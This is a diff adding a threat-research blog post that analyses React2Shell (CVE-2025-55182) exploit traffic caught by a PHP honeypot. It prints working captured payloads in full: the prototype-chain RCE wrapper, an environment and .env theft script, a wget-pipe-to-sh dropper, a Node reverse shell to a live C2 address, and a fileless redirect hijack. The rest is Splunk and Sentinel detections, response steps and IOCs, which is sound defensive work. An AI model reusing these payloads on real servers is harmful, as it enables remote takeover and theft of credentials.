@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Detecting React2Shell (CVE-2025-55182) Exploitation in Splunk and Sentinel | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/detect-react2shell/">
+<meta name="description" content="My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can&#x27;t have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&amp;CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/detect-react2shell/">
+<meta property="og:title" content="Detecting React2Shell (CVE-2025-55182) Exploitation in Splunk and Sentinel | Global SOC">
+<meta property="og:description" content="My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can&#x27;t have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&amp;CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Detecting React2Shell (CVE-2025-55182) Exploitation in Splunk and Sentinel | Global SOC">
+<meta name="twitter:description" content="My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can&#x27;t have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&amp;CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/detect-react2shell/#article",
+      "url": "https://globalsoc.com.au/blog/detect-react2shell/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/detect-react2shell/"
+      },
+      "headline": "Detecting React2Shell: Six Payloads, a Reverse Shell Sent 54 Times, and the Rules That Catch Them",
+      "description": "My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can't have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.",
+      "datePublished": "2026-11-09",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Detecting React2Shell: Six Payloads, a Reverse Shell Sent 54 Times, and the Rules That Catch Them",
+          "item": "https://globalsoc.com.au/blog/detect-react2shell/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-09">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 9 November 2026</p>
+<h1>Detecting React2Shell: Six Payloads, a Reverse Shell Sent 54 Times, and the Rules That Catch Them</h1>
+<p>My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can&#x27;t have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&amp;CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.</p>
+<nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the decoded payloads, so adapt the field names to your environment.</p>
+
+<h2 id="what">1. What Hit the Server</h2>
+
+<p>React2Shell (CVE-2025-55182) is a CVSS 10 bug in React Server Components. One unauthenticated POST to a vulnerable Next.js App Router site runs JavaScript inside the Node.js server. My honeypot is Apache and PHP, with no Node at all. It still got 70 exploit requests, because nobody checks first.</p>
+
+<p>That makes it a clean sample. Nothing could run, so I kept every payload whole. They fall into six types:</p>
+
+<table><thead><tr><th>Payload</th><th>Requests</th><th>Sources</th></tr></thead><tbody>
+<tr><td>Reverse shell</td><td>54</td><td>1</td></tr>
+<tr><td>Command check (run <code>echo</code>, return the output)</td><td>9</td><td>5</td></tr>
+<tr><td>Marker check (no command)</td><td>4</td><td>4</td></tr>
+<tr><td>Secret theft (<code>id</code>, <code>env</code>, <code>.env</code>)</td><td>1</td><td>1</td></tr>
+<tr><td>Dropper (<code>wget | sh</code>)</td><td>1</td><td>1</td></tr>
+<tr><td>Redirect hijack (fileless)</td><td>1</td><td>1</td></tr>
+</tbody></table>
+
+<p>The reverse shell is the one that sticks with me. The exact same bytes arrived 54 times, on ten different days, from one IP, roughly every two hours. Someone has a cron job pointed at a list of targets, and nobody's pruning it.</p>
+
+<h2 id="steps">2. The Attack, Step by Step</h2>
+
+<h3><span class="kc">Exploit</span> Step 1: The wrapper</h3>
+<p>Every payload uses the same wrapper. Here's the simplest, the marker check:</p>
+<pre><code>POST / HTTP/1.1
+User-Agent: Mozilla/5.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=DUOSCANNER777;307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</code></pre>
+<p>It's a three-field multipart form in React's Server Action wire format. Field 1 (<code>"$@0"</code>) hands chunk 0 to the decoder as a raw internal object. Chunk 0 then walks <code>__proto__</code> to get a real <code>then</code> method, and walks <code>constructor:constructor</code> to reach <code>Function</code>. The decoder ends up calling <code>Function(_prefix + "1337")</code>, so the <code>_prefix</code> string runs as JavaScript (T1190, T1059.007). The real attack also sends a <code>Next-Action</code> header so Next.js routes the POST to that decoder. My packet capture shows the reverse-shell bot sending <code>Next-Action: x</code>.</p>
+<p>To get results back, payloads throw a fake <code>NEXT_REDIRECT</code> error. Next.js copies its "digest" into the <code>x-action-redirect</code> response header, so the command output comes back in a header.</p>
+
+<h3><span class="kc">Exploit</span> Step 2: Check before acting</h3>
+<p>The marker check above runs nothing. It only asks Next.js to redirect to <code>/login?a=DUOSCANNER777</code>. If that comes back, the site is vulnerable. The command checks go one step further, running <code>echo &lt;random&gt;</code> and returning it.</p>
+
+<h3><span class="kc">Credential Access</span> Step 3a: Steal the environment</h3>
+<pre><code>var r;
+try{
+  if(process.mainModule&amp;&amp;process.mainModule.require){
+    r=process.mainModule.require('child_process').execSync('timeout 8 id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null')
+  }else{
+    var rr=process.binding('spawn_sync').spawn({file:'/bin/sh',args:['sh','-c','id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null'],envPairs:Object.entries(process.env).map(function(e){
+      return e[0]+'='+e[1]
+    }),stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]});
+    r=Buffer.from(rr.output[1]||'')+Buffer.from(rr.output[2]||'')
+  }
+}catch(e){
+  r=''
+}throw Object.assign(new Error('x'),{digest:Buffer.from(String(r)).toString('base64')});</code></pre>
+<p>One round trip returns <code>id</code>, the whole process environment and <code>.env</code>, base64-encoded in the error digest (T1552.001, T1082). For a containerised Next.js app, that's the database URL, auth secret and cloud keys. Note that blocking <code>/.env</code> at the web server does nothing here. The payload reads the file from inside the application.</p>
+
+<h3><span class="kc">Delivery</span> Step 3b: Drop and run</h3>
+<pre><code>var res=process.mainModule.require('child_process').execSync('(cd /tmp; crontab -r 2&gt;/dev/null; wget hxxp://134.209.89.212/r -O- | sh) ; echo 11111').toString().trim();
+throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});</code></pre>
+<p><code>crontab -r</code> wipes the user's crontab, which removes a competitor's persistence or your own jobs (T1070, T1053.003). Then it fetches a script and pipes it into <code>sh</code> without touching disk (T1105, T1059.004).</p>
+
+<h3><span class="kc">C2</span> Step 3c: Reverse shell</h3>
+<pre><code>var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();
+cl.connect(12323,'91.92.40[.]12',()=&gt;{
+  cl.pipe(s.stdin);
+  s.stdout.pipe(cl);
+  s.stderr.pipe(cl);
+});</code></pre>
+<p>Node spawns <code>/bin/sh</code> and pipes it over TCP to port 12323 on the same IP that sent the exploit (T1059.004, T1571). The only thing on the host is <code>node</code> making an outbound connection to a high port and starting a shell with no arguments.</p>
+
+<h3><span class="kc">Actions on Objectives</span> Step 3d: Fileless redirect hijack</h3>
+<pre><code>(function(){
+  var r=process.mainModule.require,u='hxxps://return[.]st/',h=function(m){
+    var o=m.Server.prototype.emit;
+    m.Server.prototype.emit=function(t){
+      if(t==='request'){
+        var q=arguments[1],s=arguments[2];
+        if(q.method==='GET'||q.method==='HEAD'){
+          s.writeHead(307,{Location:u});
+          s.end();
+          return true
+        }
+      }return o.apply(this,arguments)
+    }
+  };
+  h(r('http'));
+  try{
+    h(r('https'))
+  }catch(e){
+  }
+})();
+try{
+  process.mainModule.require('child_process').exec('echo lol')
+}catch(e){
+};
+var e=new Error('NEXT_REDIRECT');
+e.digest='NEXT_REDIRECT;replace;hxxps://return[.]st/;307;';
+throw e;</code></pre>
+<p>This is the one EDR will struggle with. It patches Node's <code>Server.prototype.emit</code> in memory so every GET and HEAD gets a 307 to the attacker's site, while POST keeps working so they can re-exploit later. No file is written, and the only process it starts is a throwaway <code>echo lol</code>. File-integrity checks and image scans see nothing. The symptom is in your traffic: a site that suddenly answers almost everything with a redirect (T1565.003 Runtime Data Manipulation, T1491.002 External Defacement).</p>
+
+<h2 id="pyramid">3. Pyramid of Pain</h2>
+<table><thead><tr><th>Level</th><th>Indicator</th><th>What I'd do with it</th></tr></thead><tbody>
+<tr><td>IP / domain</td><td>Reverse-shell C2 <code>91.92.40[.]12:12323</code>; dropper <code>134.209.89[.]212</code>; redirect target <code>return[.]st</code></td><td>Block, and expect them to change.</td></tr>
+<tr><td>Network artefacts</td><td>Boundary <code>----WebKitFormBoundaryx8jO2oVc6SWP3Sad</code> (copied from the public PoC); markers <code>DUOSCANNER777</code>, <code>R2SHELL_</code></td><td>Great free signals. A real browser never repeats a boundary. But a fixed boundary is a copy-paste habit that one edit removes.</td></tr>
+<tr><td>Tools</td><td><code>$1:__proto__:then</code>, <code>$1:constructor:constructor</code>, <code>resolved_model</code></td><td>The exploit can't work without walking the prototype chain. Matching these strings catches every variant here.</td></tr>
+<tr><td>TTPs</td><td><code>node</code> spawning a shell; <code>node</code> connecting to a high port on a public IP; a site whose redirect rate jumps to 90%+</td><td>Highest value. These catch the next Node RCE too, not just React2Shell.</td></tr>
+</tbody></table>
+
+<h2 id="web">4. Web-Layer Detections</h2>
+<p>For Org B I've parsed the honeypot's nginx log into a <code>WebAccess</code> function. For Org A I've used raw nginx where we need the body, and the CIM <code>Web</code> data model otherwise. Most production logs don't record POST bodies. A WAF with body inspection (Azure WAF, AWS WAF or Cloudflare all have managed React2Shell rules) is the realistic place for W1.</p>
+<pre><code>let WebAccess = Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
+          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
+
+<h3>W1. The React2Shell wrapper, classified by payload (T1190)</h3>
+<p><span class="org orgB">Org B</span> Tested: produced the table in section 1.</p>
+<pre><code>WebAccess
+| where Method == "POST" and ContentType startswith "multipart/form-data"
+| where Body has "__proto__" and Body has "constructor:constructor"
+| extend Payload = case(
+    Body has "child_process" and Body has "net" and Body has ".connect(", "reverse shell",
+    Body has "Server.prototype.emit", "redirect hijack",
+    Body has_any ("wget", "curl") and Body has "| sh", "dropper",
+    Body has "===ENV===" or (Body has "env" and Body has ".env"), "secret theft",
+    Body has "execSync" or Body has "spawn_sync", "command check",
+    "marker check")
+| summarize Requests = count(), Sources = dcount(SrcIp), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Payload
+| order by Requests desc</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web sourcetype=nginx:access method=POST "multipart/form-data" "__proto__" "constructor:constructor"
+| eval payload=case(
+    searchmatch("child_process") AND searchmatch(".connect("), "reverse shell",
+    searchmatch("Server.prototype.emit"),                       "redirect hijack",
+    (searchmatch("wget") OR searchmatch("curl")) AND searchmatch("| sh"), "dropper",
+    searchmatch("===ENV==="),                                   "secret theft",
+    searchmatch("execSync") OR searchmatch("spawn_sync"),       "command check",
+    true(),                                                     "marker check")
+| stats count dc(clientip) as sources min(_time) as first max(_time) as last by payload</code></pre>
+<p>On a site that runs Next.js, any hit is high severity. Check whether you're on a patched React and Next.js version, then go straight to E1 and E2.</p>
+
+<h3>W2. The public PoC's fixed multipart boundary</h3>
+<p><span class="org orgB">Org B</span> Tested: 61 requests from 7 sources.</p>
+<pre><code>WebAccess
+| where Method == "POST" and ContentType has "boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+| summarize Requests = count(), Sources = dcount(SrcIp)</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count dc(Web.src) as sources from datamodel=Web
+    where Web.http_method=POST Web.http_content_type="*boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad*"
+    by Web.dest</code></pre>
+<p>This works even where bodies aren't logged, because the boundary is in the <code>Content-Type</code> header. That makes it a good first rule for anyone without a WAF.</p>
+
+<h3>W3. The same exploit, over and over</h3>
+<p><span class="org orgB">Org B</span> Tested: <code>91.92.40.12</code> sent one identical body (one hash) 54 times over 10 days. The only other hit was my own scanner (5 requests, 5 different bodies).</p>
+<pre><code>WebAccess
+| where Method == "POST" and Body has "__proto__" and Body has "constructor:constructor"
+| summarize Requests = count(), Days = dcount(bin(TimeGenerated, 1d)), Hashes = dcount(hash_sha256(Body)) by SrcIp
+| where Requests &gt;= 5</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web sourcetype=nginx:access method=POST "__proto__" "constructor:constructor"
+| eval body_hash=sha256(request_body)
+| stats count dc(eval(strftime(_time,"%F"))) as days dc(body_hash) as hashes by clientip
+| where count &gt;= 5</code></pre>
+<p>One body, many days: that's automation with a target list. Feed the source IP to your blocklist. More importantly, the destination in the body is the C2, so hunt for it in your egress logs.</p>
+
+<h2 id="endpoint">5. Endpoint Detections</h2>
+<h3>E1. Node spawns a shell or recon tool (T1059.004)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    (ParentBaseFileName IN ("node","next-server") OR GrandParentBaseFileName IN ("node","next-server"))
+    FileName IN ("sh","bash","dash","wget","curl","id","env","cat","crontab","whoami","uname")
+| table _time ComputerName UserName GrandParentBaseFileName ParentBaseFileName FileName CommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ ("node", "next-server") or InitiatingProcessParentFileName in~ ("node", "next-server")
+| where FileName in~ ("sh","bash","dash","wget","curl","id","env","cat","crontab","whoami","uname")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine</code></pre>
+<p>Next.js servers rarely shell out. Image processing (<code>sharp</code>) runs in-process, and build steps happen at build time. Baseline for a week, and anything new is high severity. This rule catches the command checks, the theft payload and the dropper.</p>
+
+<h3>E2. Node opens a shell and calls out on a high port (reverse shell)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=NetworkConnectIP4
+    NOT RemotePort IN (80, 443, 5432, 3306, 6379, 27017)
+| where NOT cidrmatch("10.0.0.0/8", RemoteAddressIP4) AND NOT cidrmatch("172.16.0.0/12", RemoteAddressIP4)
+    AND NOT cidrmatch("192.168.0.0/16", RemoteAddressIP4)
+| join type=inner aid ContextProcessId_decimal
+    [ search index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2 FileName IN ("node","next-server")
+      | rename TargetProcessId_decimal as ContextProcessId_decimal
+      | fields aid ContextProcessId_decimal FileName CommandLine ]
+| table _time ComputerName FileName CommandLine RemoteAddressIP4 RemotePort</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>let NodeShells = DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ ("node", "next-server") and FileName in~ ("sh", "bash", "dash")
+| project DeviceId, ShellTime = Timestamp, NodePid = InitiatingProcessId, ShellCmd = ProcessCommandLine;
+DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ ("node", "next-server")
+| where RemoteIPType == "Public" and RemotePort !in (80, 443, 5432, 3306, 6379, 27017)
+| join kind=inner NodeShells on DeviceId, $left.InitiatingProcessId == $right.NodePid
+| where Timestamp between (ShellTime - 1m .. ShellTime + 1m)
+| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessCommandLine, ShellCmd</code></pre>
+<p>A web server process connecting to a public IP on a port that isn't a database or HTTPS, around the same time it started a shell, is a reverse shell. Critical severity. Add your legitimate outbound dependencies (payment APIs on unusual ports, for example) to the port allowlist.</p>
+
+<h3>E3. Crontab wipe or environment dump from an app runtime (T1070, T1552.001)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    ((FileName="crontab" CommandLine="*-r*")
+     OR (FileName IN ("sh","bash","dash") CommandLine="*env*" CommandLine="*.env*"))
+    (ParentBaseFileName IN ("node","php","php-fpm*","java","python*") OR GrandParentBaseFileName IN ("node","php","php-fpm*","java","python*"))
+| table _time ComputerName UserName ParentBaseFileName FileName CommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where (FileName == "crontab" and ProcessCommandLine has "-r")
+     or (FileName in~ ("sh","bash","dash") and ProcessCommandLine has "env" and ProcessCommandLine has ".env")
+| where InitiatingProcessFileName in~ ("node","php","php-fpm","java","python3")
+     or InitiatingProcessParentFileName in~ ("node","php","php-fpm","java","python3")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre>
+<p>This catches the dropper's <code>crontab -r</code> and the theft payload's <code>env; cat .env</code>. It's written for any app runtime (Node, PHP, Java, Python), because the same commands show up in RCE payloads for all of them.</p>
+
+<h3>E4. The fileless hijack: a site that suddenly redirects everything</h3>
+<p>No EDR rule will see an in-memory patch to <code>Server.prototype.emit</code>. Your traffic will. Compare each site's redirect rate with its own baseline:</p>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count from datamodel=Web where Web.http_method IN ("GET","HEAD") by _time span=5m Web.dest Web.status
+| rename Web.* as *
+| eval is_redirect=if(status&gt;=300 AND status&lt;400, count, 0)
+| stats sum(count) as total sum(is_redirect) as redirects by _time dest
+| eval redirect_pct=round(100*redirects/total, 1)
+| streamstats window=12 current=f avg(redirect_pct) as baseline by dest
+| where total &gt;= 50 AND redirect_pct &gt;= 90 AND baseline &lt; 20</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>// AppServiceHTTPLogs shown; the same logic works on Front Door, App Gateway or your WebAccess source
+let Baseline = AppServiceHTTPLogs
+| where TimeGenerated between (ago(1d) .. ago(15m)) and CsMethod in ("GET", "HEAD")
+| summarize BaselinePct = round(100.0 * countif(ScStatus between (300 .. 399)) / count(), 1) by _ResourceId;
+AppServiceHTTPLogs
+| where TimeGenerated &gt; ago(15m) and CsMethod in ("GET", "HEAD")
+| summarize Total = count(), Redirects = countif(ScStatus between (300 .. 399)) by _ResourceId
+| extend RedirectPct = round(100.0 * Redirects / Total, 1)
+| join kind=inner Baseline on _ResourceId
+| where Total &gt;= 50 and RedirectPct &gt;= 90 and BaselinePct &lt; 20</code></pre>
+<p>A synthetic check that fetches your home page and alerts on a cross-domain <code>Location</code> header does the same job with less tuning. It's worth having for any public site.</p>
+
+<h2 id="respond">6. When It Fires</h2>
+<ol>
+<li><strong>W1 to W3 only:</strong> confirm the target isn't running Next.js App Router, or is patched. Hunt for the C2 IP from the body in your egress logs.</li>
+<li><strong>E1 or E2:</strong> assume the app is compromised. <span class="org orgA">Org A</span> Network-contain the host in Falcon. <span class="org orgB">Org B</span> Isolate it in Defender. If it's a container, also scale the deployment to zero, or cordon the node.</li>
+<li><strong>Assume the secrets are gone.</strong> The theft payload sends back <code>env</code> and <code>.env</code> in one request. Rotate everything the app's environment held.</li>
+<li><strong>E4 fired:</strong> restart every app instance. The hijack only lives in memory. Then patch, or the next POST puts it straight back.</li>
+<li><strong>Patch</strong> React and Next.js to fixed versions, and redeploy from a clean image.</li>
+</ol>
+
+<h2 id="harden">7. Hardening</h2>
+<ul>
+<li>Patch React Server Components and Next.js to the fixed releases.</li>
+<li>Turn on your WAF's managed React2Shell rule. All the major cloud WAFs shipped one within days.</li>
+<li>Run Node as a non-root user with no shell in the image (distroless). Then <code>child_process</code> payloads have nothing to start.</li>
+<li>Default-deny egress from app containers. That kills the reverse shell and the dropper outright.</li>
+<li>Keep secrets out of the process environment where possible (a secret store with short-lived tokens), so a single <code>env</code> dump isn't game over.</li>
+</ul>
+
+<h2 id="iocs">8. IOCs</h2>
+<table><thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead><tbody>
+<tr><td>Reverse shell C2</td><td><code>91.92.40[.]12:12323/tcp</code></td><td>Also the sending IP; 54 identical attempts</td></tr>
+<tr><td>Second stage</td><td><code>hxxp://134.209.89[.]212/r</code></td><td>Dropper, piped to <code>sh</code></td></tr>
+<tr><td>Redirect target</td><td><code>hxxps://return[.]st/</code></td><td>Fileless hijack</td></tr>
+<tr><td>Boundary</td><td><code>----WebKitFormBoundaryx8jO2oVc6SWP3Sad</code>; <code>----CveSweep</code> + 8 hex</td><td>Public PoC; sweep tool</td></tr>
+<tr><td>Markers</td><td><code>R2SHELL_</code> + 10 hex, <code>DUOSCANNER777</code>, <code>RECONX_R2S_OK</code>, <code>11111</code></td><td>In the body, and in <code>x-action-redirect</code> on a vulnerable server</td></tr>
+<tr><td>Body strings</td><td><code>$1:__proto__:then</code>, <code>$1:constructor:constructor</code>, <code>resolved_model</code>, <code>_formData</code></td><td>Every variant</td></tr>
+</tbody></table>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
